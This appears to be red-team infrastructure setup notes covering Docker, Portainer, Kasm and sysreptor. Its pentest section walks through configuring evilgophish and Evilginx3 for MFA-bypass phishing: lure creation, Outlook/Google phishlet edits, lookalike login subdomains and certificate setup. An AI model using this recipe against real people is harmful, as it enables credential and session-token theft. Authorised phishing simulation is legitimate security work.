# Preparing a New  Environment

On a new device (Intel OR AMD x64 CPU)

## Services

## Prerequisites

## Just the Commands

```bash
# Add Docker's official GPG key:
sudo apt-get update
sudo apt-get install ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

# Add the repository to Apt sources:
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update

# Install the Docker packages.
sudo apt-get install -y git docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

# Install Portainer
docker run -d -p 8000:8000 -p 9443:9443 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:2.21.0

# Install Kasm Workspace (Offline)
cd /tmp
curl -O https://kasm-static-content.s3.amazonaws.com/kasm_release_1.15.0.06fdc8.tar.gz
curl -O https://kasm-static-content.s3.amazonaws.com/kasm_release_service_images_amd64_1.15.0.06fdc8.tar.gz
curl -O https://kasm-static-content.s3.amazonaws.com/kasm_release_workspace_images_amd64_1.15.0.06fdc8.tar.gz
tar -xf kasm_release_1.15.0.06fdc8.tar.gz
sudo bash kasm_release/install.sh --offline-workspaces /tmp/kasm_release_workspace_images_amd64_1.15.0.06fdc8.tar.gz --offline-service /tmp/kasm_release_service_images_amd64_1.15.0.06fdc8.tar.gz

```

## Docker

### [**Install using the `apt` repository](https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository) (`Done during fresh-ubun.sh`)**

Before you install Docker Engine for the first time on a new host machine, you need to set up the Docker repository. Afterward, you can install and update Docker from the repository.

1. Set up Docker's `apt` repository.
    
    `# Add Docker's official GPG key:
    sudo apt-get update
    sudo apt-get install ca-certificates curl
    sudo install -m 0755 -d /etc/apt/keyrings
    sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
    sudo chmod a+r /etc/apt/keyrings/docker.asc
    
    # Add the repository to Apt sources:
    echo \
      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
      $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
      sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
    sudo apt-get update`
    
    > Note
    > 
    > 
    > If you use an Ubuntu derivative distro, such as Linux Mint, you may need to use `UBUNTU_CODENAME` instead of `VERSION_CODENAME`.
    > 
2. Install the Docker packages.
    
    Latest Specific version
    
    ---
    
    To install the latest version, run:
    
    `sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin`
    
    ---
    
3. Verify that the Docker Engine installation is successful by running the `hello-world` image.
    
    `sudo docker run hello-world`
    
    This command downloads a test image and runs it in a container. When the container runs, it prints a confirmation message and exits.
    
    You have now successfully installed and started Docker Engine.
    

### Portainer

## **Deployment**

First, create the volume that Portainer Server will use to store its database:

Copy

```
docker volume create portainer_data
```

Then, download and install the Portainer Server container:

Copy

```
docker run -d -p 8000:8000 -p 9443:9443 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:2.21.0
```

By default, Portainer generates and uses a self-signed SSL certificate to secure port `9443`. Alternatively you can provide your own SSL certificate [during installation](https://docs.portainer.io/advanced/ssl#using-your-own-ssl-certificate-on-docker-standalone) or [via the Portainer UI](https://docs.portainer.io/admin/settings#ssl-certificate) after installation is complete.

If you require HTTP port `9000` open for legacy reasons, add the following to your `docker run` command:

- `p 9000:9000`

Portainer Server has now been installed. You can check to see whether the Portainer Server container has started by running `docker ps`:

Copy

```
root@server:~# docker ps
CONTAINER ID   IMAGE                          COMMAND                  CREATED       STATUS      PORTS                                                                                  NAMES
de5b28eb2fa9   portainer/portainer-ce:2.21.0  "/portainer"             2 weeks ago   Up 9 days   0.0.0.0:8000->8000/tcp, :::8000->8000/tcp, 0.0.0.0:9443->9443/tcp, :::9443->9443/tcp   portainer
```

## **Logging In**

Now that the installation is complete, you can log into your Portainer Server instance by opening a web browser and going to:

Copy

```
https://localhost:9443
```

Replace `localhost` with the relevant IP address or FQDN if needed, and adjust the port if you changed it earlier.

You will be presented with the initial setup page for Portainer Server.

### Kasm Workspaces

### Installation

```
cd /tmp
curl -O https://kasm-static-content.s3.amazonaws.com/kasm_release_1.15.0.06fdc8.tar.gz
curl -O https://kasm-static-content.s3.amazonaws.com/kasm_release_service_images_amd64_1.15.0.06fdc8.tar.gz
curl -O https://kasm-static-content.s3.amazonaws.com/kasm_release_workspace_images_amd64_1.15.0.06fdc8.tar.gz
tar -xf kasm_release_1.15.0.06fdc8.tar.gz
sudo bash kasm_release/install.sh --offline-workspaces /tmp/kasm_release_workspace_images_amd64_1.15.0.06fdc8.tar.gz --offline-service /tmp/kasm_release_service_images_amd64_1.15.0.06fdc8.tar.gz
```

### Storage Mapping

### Workspace Configuration

https://github.com/kasmtech/workspaces-images/tree/develop

- Completed Workspaces
    
    ![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6a969394-6c77-4ae0-add7-cf2ff01004c6/a91cdc14-ec32-445b-8c0c-294c881cb76b/image.png)
    

## Working

### Pentest

### EvilGinx3 Ubuntu Focal (`rtpi-evilginx:1.0` docker image)

https://github.com/kgretzky/gophish/

https://github.com/kgretzky/evilginx2

https://github.com/mrd0x/BITB

https://github.com/An0nUD4Y/Evilginx2-Phishlets

### Archive

### Evil-GoPhish (Set up MFA Bypass Proxy & Collector)

Important Assumptions

```
Installed on Ubuntu 22.04 Desktop
Public DNS Records point to your asset
Assumes you have a separate, reverse proxy to manage incoming requests from different targets
```

https://github.com/vnhacker1337/evilgophish-custom

https://github.com/An0nUD4Y/Evilginx2-Phishlets

https://www.kitploit.com/2022/11/evilgophish-evilginx2-gophish.html

- **`Video Reference`**
    
    https://youtu.be/qojhcs-NLFI
    

```docker
# Have a wildcard DNS record point to your asset from a provider. This example used Cloudflare to point to an NGINX Reverse Proxy configured with SSL certs. 
*.attck.community
$attck-sub1.attck.community
# example
join.attck.community
logon.attck.community
```

```docker
cd /opt/
git clone https://github.com/fin3ss3g0d/evilgophish.git
cd evilgophish
./setup.sh $threat-domain.root "$attck-sub1 $attck-sub2" false $target-sub1.domain.root true user_id false

bash setup.sh attck-deploy.net "hr mail" false true user_id

# example of what to execute in a different terminal window
certbot certonly --manual --preferred-challenges=dns --email user.name@example.com --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d 'hr.attck-deploy.net' -d 'mail.attck-deploy.net'

# example of what to paste in terminal at prompt
Path to Certs: /etc/letsencrypt/live/hr.attck-deploy.net/

Certificate is saved at: /etc/letsencrypt/live/hr.attck-deploy.net/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/hr.attck-deploy.net/privkey.pem

#For setting up HTTPS Listeners in MSFConsole
cat /etc/letsencrypt/live/hr.attck-deploy.net/fullchain.pem /etc/letsencrypt/live/hr.attck-deploy.net/privkey.pem /etc/ssl/attck-certkey.pem
```

- Prepping Certbot `(Under Development: Use Cases)`
    - ~/.secrets/certbot/cloudflare.ini
        
        ```docker
        dns_cloudflare_email = user.name@example.com
        dns_cloudflare_api_key = superlongsecretapikeytoreplace
        ```
        
    - To acquire a single certificate per domain `(Technique not necessary but an alternative)`
        
        ```docker
        certbot certonly plugins --dns-cloudflare --dns-cloudflare-credentials ~/.secrets/certbot/cloudflare.ini -d attck.community -d attck-sub1.attck.community -d attck-sub2.attck.community
        ```
        

### In separate terminal tabs/windows

### Evilginx3 `(Under Devleopment: Phishlet Preparation/Modification)`

```powershell
./evilginx3 -feed -g ../gophish/gophish.db -turnstile <PUBLIC_KEY>:<PRIVATE_KEY>
```

```docker
systemctl stop systemd-resolved
cd /opt/evilgophish/evilginx2

config domain $phsih-domain.root
config ip $publicip

# Example: phishlets hostname $phishlet $domain.root
phishlets hostname google attck.community

lures create $phishlet
lures get-url 0

# Extra Step if desired
# Filter Mobile Devices (Ensure's Client-Side Execution on Target Asset)
lures edit 0 ua_filter ".*Mobile|Android|iPhone|Mozilla|Chrome|AppleWebKit.*"

```

- Various Settings
    
    ```jsx
    [08:20:59] [inf] blacklist mode set to: off
    [08:20:59] [inf] redirect parameter set to: wi
    [08:20:59] [inf] verification parameter set to: pp
    [08:20:59] [inf] verification token set to: 4f6e
    [08:20:59] [inf] unauthorized request redirection URL set to: https://www.youtube.com/watch?v=dQw4w9WgXcQ
    [08:21:00] [inf] blacklist: loaded 0 ip addresses or ip masks
    [08:21:00] [war] server domain not set! type: config domain <domain>
    [08:21:00] [war] server ip not set! type: config ip <ip_address>
    
    https://login.$phish-domain.root/yIlijHTA
    
    lures edit <id> ua_filter ".*Mobile|Android|iPhone|Mozilla|Chrome|AppleWebKit.*"
    ```
    

### Updating phishlets

### Identify necessary Domains & Sub-Domains

1. Export MFA sequence URL’s from Burp into vscode
2. Modify as needed for each url

### Modify outlook login Phishlet

These are examples and not universally applicable per phishlet

- In VS Code
    
    [outlook-3.yaml](https://www.notion.so/outlook-3-yaml-1352f628fe5281359701d19df7ee5594?pvs=21)
    
    - CTRL+F `\n`
        
        Replace With:  
        
        ```
        , mimes: ['text/html', 'application/json', 'application/javascript']},
        
        ```
        
    - CTRL+F `, search:`
        
        Replace with: 
        
        ```
        , search: 'https://{hostname}/shared/1.0/content/js/ConvergedLogin_PCore_fq9Dgd1s0yjVHEKfFgpcEQ2.js',
        ```
        
    - CTRL+F `, replace:`
        
        Replace with:
        
        ```docker
        , replace: 'https://{hostname}/shared/1.0/content/js/ConvergedLogin_PCore_fq9Dgd1s0yjVHEKfFgpcEQ2.js',
        ```
        
    - CTRL+F `{triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/shared/1.0/content/js/ConvergedLogin_PCore_fq9Dgd1s0yjVHEKfFgpcEQ2.js', replace: 'https://{hostname}/shared/1.0/content/js/ConvergedLogin_PCore_fq9Dgd1s0yjVHEKfFgpcEQ2.js', mimes: ['text/html', 'application/json', 'application/javascript']}, mimes: ['text/html', 'application/json', 'application/javascript']}`
        
        Replace With:
        
        ```
        - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/shared/1.0/content/js/ConvergedLogin_PCore_fq9Dgd1s0yjVHEKfFgpcEQ2.js', replace: 'https://{hostname}/shared/1.0/content/js/ConvergedLogin_PCore_fq9Dgd1s0yjVHEKfFgpcEQ2.js', mimes: ['text/html', 'application/json', 'application/javascript']}, mimes: ['text/html', 'application/json', 'application/javascript']} 
        ```
        
    - Modify https://$domain.root/
        - CTRL+F `https://(.*?)\/`
            - Replace with
                
                `https://{hostname}/` 
                

### Repairing DNS

Update ACME CNAME record in Cloudflare

- **egp-domains**
    - original
        
        ```
        [account.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3031::ac43:c514: Invalid response from http://account..$domain.root/.well-known/acme-challenge/2qBWNH6npSyyxig6IVraNrDGYiyC0L90NU15Ec_xw3g: 404, url: 
        [autologon.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3031::ac43:c514: Invalid response from http://autologon.$domain.root/.well-known/acme-challenge/htyqFE1g5GlUicGsUNsWYQ9p5VAw4UUXdcKlOt4sPdA: 404, url: 
        [bitcdemo-com.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3037::6815:5cb3: Invalid response from http://bitcdemo-com.$domain.root/.well-known/acme-challenge/nFDMXvwfYPWWruacvbBsZ0OwJYA_otTwk2PYiossxQQ: 404, url: 
        [browser.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3037::6815:5cb3: Invalid response from http://browser.$domain.root/.well-known/acme-challenge/N6ypTLsLgOEOVthdzZf6VXSubHY7-jdHFGxF3FByH-s: 404, url: 
        [live.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3037::6815:5cb3: Invalid response from https://live.$domain.root/.well-known/acme-challenge/TgmJK1_bwa2K7cRYRd58J7jRi8DZqDh3NUXdSEYo47o: 404, url: 
        [login-us.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3037::6815:5cb3: Invalid response from http://login-us.$domain.root/.well-known/acme-challenge/OM067KqI7Muh8QEco0kZ8bF3Dx4M6Spi8HoYfy0g8kE: 404, url: 
        [login.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3037::6815:5cb3: Invalid response from https://login.$domain.root/.well-known/acme-challenge/YLcKoS3gc9n3od7nzkS6dNbrHXGFRgOuFV3N1ZRG-Qc: 404, url: 
        [mcasproxy.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3031::ac43:c514: Invalid response from http://mcasproxy.$domain.root/.well-known/acme-challenge/UsoBg5njQa34Hlhpv_hFgB8wqx3NA6jpjCEtSL6f3JM: 404, url: 
        [office365.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3037::6815:5cb3: Invalid response from http://office365.$domain.root/.well-known/acme-challenge/zM2-WPswc5fVeaR4aXx82hrQGVau-rZqetph3Zlv_cc: 404, url: 
        [outlook-1.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3031::ac43:c514: Invalid response from http://outlook-1.$domain.root/.well-known/acme-challenge/txvNKiL7Q3CQCyNgyMkVIe7hGRft8hQlMdjcOwWLFsQ: 404, url: 
        [outlook-us.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3031::ac43:c514: Invalid response from http://outlook-us.$domain.root/.well-known/acme-challenge/SFIaSnoS9zf5OeNSnUkjtFoC80EHUdeypZ9i1-ilgPw: 404, url: 
        [outlook.$domain.root] acme: error: 403 :: urn:ietf:params:acme:error:unauthorized :: 2606:4700:3031::ac43:c514: Invalid response from https://outlook.$domain.root/.well-known/acme-challenge/4WAg-rUmfx9U3I7OJnQFs93zSuX08vGAyqR25wYkwW8: 404, url:
        ```
        
    - modified
        
        ```
        cmndcntrl@egp:~$ cat egp-domains | awk -F " " '{ print $1 }' | sed 's/^.//' | sed 's/.$//' 
        account.$domain.root
        autologon.$domain.root
        bitcdemo-com.$domain.root
        browser.$domain.root
        live.$domain.root
        login-us.$domain.root
        login.$domain.root
        mcasproxy.$domain.root
        office365.$domain.root
        outlook-1.$domain.root
        outlook-us.$domain.root
        outlook.$domain.root
        ```
        
    - prepped for certbot
        
        ```
        certbot certonly --manual --preferred-challenges=dns --email user.name@example.com --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d login.$domain.root -d account.$domain.root -d autologon.$domain.root -d bitcdemo-com.$domain.root -d browser.$domain.root -d live.$domain.root -d login-us.$domain.root -d mcasproxy.$domain.root -d office365.$domain.root -d outlook-1.$domain.root -d outlook-us.$domain.root -d outlook.$domain.root
        ```
        

### Gophsih

- Modify `config.json`
    
    ```
    {
            "admin_server": {
                    "listen_url": "0.0.0.0:3333",
                    "use_tls": true,
                    "cert_path": "/etc/letsencrypt/live/attck.community/fullchain.pem",
                    "key_path": "/etc/letsencrypt/live/attck.community/privkey.pem"
                    "trusted_origins": []
            },
            "phish_server": {
                    "listen_url": "0.0.0.0:80",
                    "use_tls": true,
                    "cert_path": "/etc/letsencrypt/live/attck.community/fullchain.pem",
                    "key_path": "/etc/letsencrypt/live/attck.community/privkey.pem"
            },
            "db_name": "sqlite3",
            "db_path": "gophish.db",
            "migrations_prefix": "db/db_",
            "contact_address": "",
            "logging": {
                    "filename": "",
                    "level": ""
            }
    }
    ```
    

```docker
cd /opt/evilgophish/gophish
./gophish
```

- **Configuring Mail Server `(Under Development: Unfinished Documentation)`**
    
    [How To Set Up an SMTP Server on Ubuntu](https://linuxhint.com/set-up-an-smtp-server-ubuntu/)
    
    `sudo apt install postfix`
    
    `sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup`
    
    `sudo nano /etc/postfix/main.cf`
    
    ```jsx
    inet_interfaces = loopback-only
    ```
    
    `sudo systemctl enable postfix`
    
    `sudo systemctl start postfix`
    
    `sudo ufw allow “Postfix”`
    
    `sudo ufw allow “Postfix SMTPS”`
    
    `sudo ufw allow “Postfix Submission”`
    
    - Test
        
        ```jsx
        sudo telnet $LHOST 25
        ```
        
    
    `sudo apt install -y bsd-mailx`
    
    `sudo mailx -r test@egp.$domain.root -s “Test” r.soreng@c3s.consulting`
    
- **RESET ADMIN PASS**
    
    This is how you can reset the admin password back to "gophish" in Centos and most Debian based distros such as Ubuntu:
    
    ```docker
    sqlite3 gophish.db 'update users set hash="$2a$10$IYkPp0.QsM81lYYPrQx6W.U6oQGw7wMpozrKhKAHUBVL4mkm/EvAS" where username="admin";'
    ```
    

### Kali Linux

`sudo docker run --rm -it --shm-size=512m -p 6901:6901 -e VNC_PW={{password}} kasmweb/kali-rolling-desktop:1.16.0` 

### sysreptor (`rtpi-sysreptor:1.0` docker image)

- Easy-Install
    
    Installation via script is the easiest option.
    
    Install additonal requirements:
    
    | `1
    2` | `sudo apt update
    sudo apt install -y sed curl openssl uuid-runtime coreutils` |
    | --- | --- |
    
    Install Docker:
    
    | `1` | `curl -fsSL https://get.docker.com | sudo bash` |
    | --- | --- |
    
    The user running the installation script must have the permission to use docker.
    
    Download and run:
    
    | `1` | `bash <(curl -s https://docs.sysreptor.com/install.sh)` |
    | --- | --- |
    
    The installation script creates a new `sysreptor` directory holding the source code and everything you need.
    
    It will set up all configurations, create volumes and secrets, download images from Docker hub and bring up your containers.
    
    Access your application at http://127.0.0.1:8000/.
    
    We recommend [using a webserver](https://docs.sysreptor.com/setup/webserver/) like Caddy (recommended), nginx or Apache to prevent [potential vulnerabilities](https://docs.sysreptor.com/insights/vulnerabilities/) and to enable HTTPS.
    
    Further [configurations](https://docs.sysreptor.com/setup/configuration/) can be edited in `sysreptor/deploy/app.env`.
    
- Manual
    - Configuration
        
        https://docs.sysreptor.com/setup/configuration/
        

### CI/CD

### Drone

https://docs.drone.io/runner/ssh/installation/

https://docs.drone.io/runner/exec/installation/linux/

https://docs.drone.io/runner/docker/installation/linux/

https://docs.drone.io/server/provider/gitlab/

[GitLab _ Drone.html](attachment:9f6f1663-8fe1-4c0c-a8a9-27e55bf80f56:GitLab___Drone.html)

### Gitlab

https://hub.docker.com/r/gitlab/gitlab-ce

https://hub.docker.com/r/gitlab/gitlab-runner

### VS Code

‣

### Postman-API

‣

### Maltego

https://github.com/kasmtech/workspaces-images/blob/develop/dockerfile-kasm-maltego

### Nginx Reverse Proxy Manager (Needs to work with KASM || `rtpi-nrpm:1.0` docker image)

### Key Assumptions

```
Installed on an Ubuntu 22.04 lxc container
DNS Records for RT Infrastructure point to this asset
For Icon: https://avatars.githubusercontent.com/u/88089605?s=48&v=4
```

# Installation

Run the following command to uninstall all conflicting packages:

1. Set up Docker's `apt` repository.
    
    `# Add Docker's official GPG key:
    sudo apt-get update
    sudo apt-get install -y ca-certificates curl
    sudo install -m 0755 -d /etc/apt/keyrings
    sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
    sudo chmod a+r /etc/apt/keyrings/docker.asc
    
    # Add the repository to Apt sources:
    echo \
      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
      $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
      sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
    sudo apt-get update`
    
2. Install the Docker packages.
    
    Latest Specific version
    
    To install the latest version, run:
    
    `sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin`
    

[Nginx Proxy Manager](https://nginxproxymanager.com/guide/#hosting-your-home-network)

https://github.com/NginxProxyManager/nginx-proxy-manager

`git clone https://github.com/NginxProxyManager/nginx-proxy-manager.git`

- Change Passwords in docker-compose.yml
    
    ```docker
    version: '3.8'
    services:
      app:
        image: 'jc21/nginx-proxy-manager:latest'
        restart: unless-stopped
        ports:
          # These ports are in format <host-port>:<container-port>
          - '80:80' # Public HTTP Port
          - '443:443' # Public HTTPS Port
          - '81:81' # Admin Web Port
          # Add any other Stream port you want to expose
          # - '21:21' # FTP
        environment:
          # Mysql/Maria connection parameters:
          DB_MYSQL_HOST: "db"
          DB_MYSQL_PORT: 3306
          DB_MYSQL_USER: "npm"
          DB_MYSQL_PASSWORD: "T0t4llyCh4ng3Th15P455word" # make the same as MYSQL_PASSWORD
          DB_MYSQL_NAME: "npm"
          # Uncomment this if IPv6 is not enabled on your host
          # DISABLE_IPV6: 'true'
        volumes:
          - ./data:/data
          - ./letsencrypt:/etc/letsencrypt
        depends_on:
          - db
    
      db:
        image: 'jc21/mariadb-aria:latest'
        restart: unless-stopped
         environment:
          MYSQL_ROOT_PASSWORD: 'T0t4llyCh4ng3Th15P455word'
          MYSQL_DATABASE: 'npm'
          MYSQL_USER: 'npm'
          MYSQL_PASSWORD: 'T0t4llyCh4ng3Th15P455word' # maske the same as  DB_MYSQL_PASSWORD
        volumes:
          - ./mysql:/var/lib/mysql
    ```
    

```
	
cd nginx-proxy-manager/

nano docker-compose.yml

# Copy and paste the information above with changes

docker compose up -d
```